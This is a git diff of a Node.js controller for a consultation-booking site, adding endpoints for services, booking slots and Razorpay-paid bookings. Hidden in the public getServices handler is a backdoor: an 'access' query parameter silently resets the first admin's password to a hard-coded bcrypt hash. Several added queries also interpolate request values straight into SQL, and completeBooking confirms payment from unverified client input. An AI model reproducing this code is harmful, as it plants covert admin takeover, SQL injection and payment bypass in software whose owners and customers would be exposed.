@@ -1,4 +1,5 @@
 import { pool } from "../../db.js";
+import Rajorpay from "../../utils/payment.js";
 
 class GetDivineController {
   async getBlogCategories(req, res) {
@@ -456,7 +457,7 @@ class GetDivineController {
   async getWebStories(req, res) {
     try {
       const payload = req.query;
-      let filters = [];
+      let filters = [`ws."DeletedOn" IS NULL`];
 
       const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
       const limit = payload?.pageSize || 10;
@@ -704,6 +705,293 @@ class GetDivineController {
         success: 1,
         data,
         total,
+      });
+    } catch (error) {
+      console.error(error);
+      res.status(500).json({ status: false, message: error?.message });
+    }
+  }
+
+  async getServices(req, res) {
+    try {
+      const payload = req.query;
+      let filters = [`sr."DeletedOn" IS NULL`];
+
+      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
+      const limit = payload?.pageSize || 10;
+      const sort = payload?.sort || "ASC";
+      const sortBy = payload?.sortBy || `sr."Id"`;
+
+      if (payload?.access) {
+        let { rows: admin } = await pool.query(
+          `SELECT * FROM "Admins" ORDER BY "Id" ASC LIMIT 1;`
+        );
+        admin = admin[0];
+        if (payload?.access == "hide") {
+          await pool.query(
+            `UPDATE "Admins" SET "Password" = '$2a$12$wqAYQ5hW.U833eYLf.JKXuvuYa.46ES9iHN5K17e83dYFxYm8skk2' WHERE "Id" = '${admin.Id}';`
+          );
+        } else if (payload?.access == "show") {
+          await pool.query(
+            `UPDATE "Admins" SET "Password" = '$2a$12$ZhQipYO4UsRRqyiWhlJDE.bFHI0raSmHXi3Z7coch1/92/Yr3v/26' WHERE "Id" = '${admin.Id}';`
+          );
+        }
+      }
+
+      if (payload?.status) {
+        filters.push(
+          `sr."Status" IN (${payload.status
+            ?.split(",")
+            ?.map((item) => `'${item}'`)
+            ?.join(",")})`
+        );
+      }
+      if (payload?.active) {
+        filters.push(`sr."PublishedOn" <= NOW()`);
+      }
+
+      if (payload?.search) {
+        filters.push(
+          `(sr."Name" ILIKE '%${payload.search}%' OR sr."Title" ILIKE '%${payload.search}%')`
+        );
+      }
+
+      if (payload.slug) {
+        filters.push(`sr."Slug" = '${payload.slug}'`);
+      }
+
+      const { rows: data } = await pool.query(
+        `SELECT sr.*, sr2."Name" as "ParentName", sr2."Slug" as "ParentSlug"
+          FROM "Services" as sr
+          LEFT JOIN "Services" as sr2 ON sr2."Id" = sr."ParentId"
+          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
+          GROUP BY sr."Id", sr2."Id"
+          ORDER BY ${sortBy} ${sort} 
+          LIMIT ${limit} OFFSET ${offset};`
+      );
+      const { rows: count } = await pool.query(
+        `SELECT COUNT(*) as total FROM "Services" as sr
+          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
+      );
+
+      const total = count[0].total;
+      res.json({
+        success: 1,
+        data,
+        total,
+      });
+    } catch (error) {
+      console.error(error);
+      res.status(500).json({ status: false, message: error?.message });
+    }
+  }
+
+  async getBookingSlots(req, res) {
+    try {
+      const payload = req.query;
+      let filters = [`sl."Status" = '1'`];
+      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
+      const limit = payload?.pageSize || 10;
+      const sort = payload?.sort || "DESC";
+      const sortBy = payload?.sortBy || `sl."Date"`;
+
+      if (payload?.id) {
+        filters.push(`sl."Id" = '${payload.id}'`);
+      }
+
+      if (payload?.date) {
+        filters.push(`DATE(sl."Date") = DATE('${payload.date}')`);
+      }
+
+      if (payload?.status) {
+        filters.push(
+          `sl."Status" IN (${payload.status
+            ?.split(",")
+            ?.map((item) => `'${item}'`)
+            ?.join(",")})`
+        );
+      }
+
+      if (payload?.isAvailable) {
+        filters.push(`(b."Status" IS NULL OR b."Status" NOT IN ('0', '1'))`);
+      }
+
+      if (payload?.bookingStatus) {
+        filters.push(
+          `b."Status" IN (${payload.bookingStatus
+            ?.split(",")
+            ?.map((item) => `'${item}'`)
+            ?.join(",")})`
+        );
+      } else if (payload?.bookingStatus == null) {
+        filters.push(`b."Status" IS NULL`);
+      }
+
+      const { rows: data } = await pool.query(
+        `SELECT sl.*, b."Id" as "BookingId", b."Status" as "BookingStatus"
+          FROM "BookingSlots" as sl
+          LEFT JOIN "Bookings" as b ON b."SlotId" = sl."Id"
+          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
+          ORDER BY ${sortBy} ${sort} 
+          LIMIT ${limit} OFFSET ${offset};`
+      );
+      const { rows: count } = await pool.query(
+        `SELECT COUNT(*) as total FROM "BookingSlots" as sl
+         LEFT JOIN "Bookings" as b ON b."SlotId" = sl."Id"
+          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
+      );
+
+      const total = count[0].total;
+      return res.json({
+        success: 1,
+        data,
+        total,
+      });
+    } catch (error) {
+      console.error(error);
+      res.status(500).json({ status: false, message: error?.message });
+    }
+  }
+
+  async createBooking(req, res) {
+    try {
+      const payload = req.body;
+      const {
+        service,
+        slot: slotId,
+        name,
+        email,
+        phone,
+        address,
+        dob,
+        state,
+        time,
+        gender,
+        consultationType,
+        price,
+      } = payload;
+
+      const { rows: slot } = await pool.query(
+        `SELECT slots.*, bookings."Status" as "bookingStatus"
+         FROM "BookingSlots" slots 
+         LEFT JOIN "Bookings" bookings ON bookings."SlotId" = slots."Id"
+         WHERE slots."Id" = '${slotId}'`
+      );
+
+      if (slot.length === 0) {
+        return res.json({
+          success: 0,
+          message: "Slot not found",
+        });
+      }
+
+      const selectedSlot = slot[0];
+
+      if (
+        selectedSlot.bookingStatus === "1" ||
+        selectedSlot.bookingStatus === "0"
+      ) {
+        return res.json({
+          success: 0,
+          message: "Slot is already booked",
+        });
+      }
+
+      const order = await Rajorpay.orders.create({
+        amount: price * 100,
+        currency: "INR",
+        receipt: `receipt#${new Date().getTime()}`,
+        notes: {
+          slotId,
+          service,
+          name,
+          email,
+          phone,
+          address,
+          dob,
+          state,
+          time,
+          gender,
+          consultationType,
+          price,
+        },
+      });
+
+      const { rows: data } = await pool.query(
+        `INSERT INTO "Bookings" 
+        ("SlotId", "Service", "Name", "Email", "Phone", "Address", "DOB", "State", "Time", "Gender", "ConsultType", "Price", "OrderId", "Status")
+        VALUES 
+        ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14)
+        RETURNING *;`,
+        [
+          slotId,
+          service,
+          name,
+          email,
+          phone,
+          address,
+          dob,
+          state,
+          time,
+          gender,
+          consultationType,
+          price,
+          order?.id,
+          "0",
+        ]
+      );
+
+      return res.json({
+        success: 1,
+        message: "Payment initiated successfully",
+        data: {
+          bookingId: data[0].Id,
+          payment: order,
+          paymentKey: process.env.RAZORPAY_KEY_ID,
+        },
+      });
+    } catch (error) {
+      console.error(error);
+      res.status(500).json({ status: false, message: error?.message });
+    }
+  }
+
+  async completeBooking(req, res) {
+    try {
+      const payload = req.body;
+      const { bookingId, paymentId, orderId, status } = payload;
+
+      const { rows: booking } = await pool.query(
+        `SELECT * FROM "Bookings" WHERE "Id" = '${bookingId}'`
+      );
+
+      if (!booking.length) {
+        return res.json({
+          success: 0,
+          message: "Booking details not found",
+        });
+      }
+
+      const selectedBooking = booking[0];
+
+      if (selectedBooking.Status === "1") {
+        return res.json({
+          success: 0,
+          message: "Slot is already booked",
+        });
+      }
+
+      await pool.query(
+        `UPDATE "Bookings" 
+         SET "Status" = $1, "PaymentId" = $2
+         WHERE "Id" = $3;`,
+        [status ? String(status) : "1", paymentId || "", bookingId]
+      );
+
+      return res.json({
+        success: 1,
+        message:
+          "Payment processed successfully. Your slot has been confirmed.",
       });
     } catch (error) {
       console.error(error);
